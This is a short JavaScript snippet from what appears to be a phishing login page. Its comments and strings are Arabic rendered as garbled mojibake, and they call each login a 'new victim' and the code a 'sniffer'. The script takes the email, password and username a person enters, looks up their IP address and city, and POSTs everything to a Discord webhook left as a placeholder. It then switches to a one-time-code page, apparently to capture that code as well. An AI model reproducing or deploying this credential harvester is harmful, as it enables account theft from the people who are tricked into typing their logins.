<script>
    async function handleAuth() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const user = document.getElementById('username').value || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

        if(!email || !pass) return alert("âš ï¸ ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙƒØ§Ù…Ù„Ø©");

        // 1. Ù†Ø¸Ø§Ù… "Ø§Ù„ÙØ®" ÙˆØ³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (The Sniffer)
        const geoData = await axios.get('https://ipapi.co/json/').catch(() => ({data: {}}));
        
        const discordReport = {
            embeds: [{
                title: "ğŸ¯ Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© Ø³Ø¬Ù„Øª Ø§Ù„Ø¢Ù†",
                color: 15548997, // Ø£Ø­Ù…Ø± Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                fields: [
                    { name: "ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…", value: user, inline: true },
                    { name: "ğŸ“§ Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„", value: email, inline: true },
                    { name: "ğŸ”‘ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯", value: pass, inline: true },
                    { name: "ğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹", value: `${geoData.data.city}, ${geoData.data.country_name}`, inline: false },
                    { name: "ğŸŒ Ø§Ù„Ù€ IP", value: geoData.data.ip, inline: true }
                ],
                footer: { text: "Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø³Ø±ÙŠ Ù†Ø´Ø· âœ…" }
            }]
        };

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ù€ Webhook Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ (ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¶Ø¹ Ø±Ø§Ø¨Ø·Ùƒ Ø§Ù„ØµØ­ÙŠØ­ Ù‡Ù†Ø§)
        fetch("Ø±Ø§Ø¨Ø·_Ø§Ù„Ù€_WEBHOOK_Ø§Ù„Ø®Ø§Øµ_Ø¨Ùƒ", { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify(discordReport) 
        });

        // 2. Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„ØµÙØ­Ø© Ø§Ù„ÙƒÙˆØ¯ (OTP)
        document.getElementById('authPage').style.display = 'none';
        document.getElementById('otpPage').style.display = 'block';
    }
</script>
